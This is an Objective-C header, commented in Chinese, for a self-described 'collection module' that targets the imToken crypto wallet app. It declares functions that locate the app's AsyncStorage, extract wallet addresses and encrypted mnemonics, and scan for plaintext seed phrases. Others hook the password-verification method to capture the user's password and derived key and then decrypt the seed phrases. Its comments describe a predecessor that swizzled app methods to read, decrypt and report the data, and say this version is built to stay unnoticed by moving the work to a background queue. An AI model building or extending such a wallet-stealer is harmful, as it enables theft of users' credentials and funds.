//
//  ImToken.h — 自己实现的 imToken 采集模块
//
//  为什么要自己做：原版 b2lib 用 method_setImplementation 替换 App 方法后，
//  在替换实现里做「读文件 + KDF + 上报」，如果那个方法在主线程被调用就会
//  卡死界面。这个实现的原则：
//    · 钩子里只做内存拷贝（微秒级），立刻返回原始实现的结果
//    · 所有 IO / 解密 / 上报都扔到后台串行队列
//
#import <Foundation/Foundation.h>

@interface ImToken : NSObject

/// RCTAsyncLocalStorage_V1 目录（找不到返回 nil）
+ (NSString *)storageDir;

/// manifest.json 内容（key -> NSString 或 NSNull）
+ (NSDictionary *)manifest;

/// 读 AsyncStorage 里某个 key 的值（自动处理「大值存文件」的情况）
+ (NSString *)storageValueForKey:(NSString *)key;

/// 所有能解析出来的钱包条目（address / encMnemonic / name）
+ (NSArray<NSDictionary *> *)wallets;

/// 在 AsyncStorage 的全部内容里做助记词特征匹配（12/15/18/21/24 个英文单词）
+ (NSArray<NSString *> *)plaintextMnemonics;

/// 装上 deriveKeyAndVerifyMacWithPassword:crypto:error: 的钩子
+ (BOOL)installHook;

/// 钩子是否已经捕获到密码
+ (BOOL)hookFired;
+ (NSString *)capturedPassword;
+ (id)capturedDerivedKey;

/// 用捕获到的派生密钥去解 encMnemonic（尽力而为，失败返回 nil）
+ (NSString *)decryptMnemonic:(NSString *)encMnemonic;

+ (NSString *)lastError;

@end
